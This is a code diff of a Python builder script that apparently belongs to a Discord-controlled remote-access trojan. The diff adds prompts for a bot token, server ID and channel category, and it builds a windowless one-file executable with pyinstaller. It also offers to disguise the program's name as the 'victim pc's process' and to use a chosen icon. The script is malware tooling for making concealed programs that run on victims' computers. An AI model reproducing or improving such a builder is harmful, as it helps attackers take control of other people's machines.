@@ -5,13 +5,23 @@ def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
 
-def build(TOKEN, PROGRAMNAME, ICON):
+def build(TOKEN, SERVER_ID, CAGETORY_ID, PROGRAMNAME, ICON):
     if ICON == "":
         ICON = "icon.ico"
     build_command = f"pyinstaller --clean --onefile --noconsole --icon={ICON} main-current.py --add-data=seedir\\*:seedir"
     # NOTE: achieve modifying file by reading the main-developer first, modify lines by doing data[0] = something like that, then
     # NOTE: creat a cache.py file, pyinstaller it and then delete it.
     # TODO: fix .gitignore lol
+
+
+def interrogate_i_mean_ask(message):
+    value = None
+    while not value:
+        value = input(f"Enter your {message}: ")
+        if not value:
+            print(f"Please enter a valid {message}")
+
+    return value
 
 result = subprocess.run(['pip', 'freeze'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
 installed_packages = result.stdout.split('\n')
@@ -35,10 +45,8 @@ for necessary in necessary_packages:
                 quit()
 
 print('\n')
-token = None
-while not token:
-    token = input("Please input your token: ")
-    if not token:
-        print("Please enter a valid token")
+token = interrogate_i_mean_ask("token")
+guild_id = interrogate_i_mean_ask("server ID")
+category_id = interrogate_i_mean_ask("category ID (This is for creating channel)")
 programname = str(input("Enter program name you desire ( leave blank to set as victim pc's process ): ")) # TODO: achieve this function
 icon = str(input("Enter icon path ( leave blank to set as icon.ico ): "))
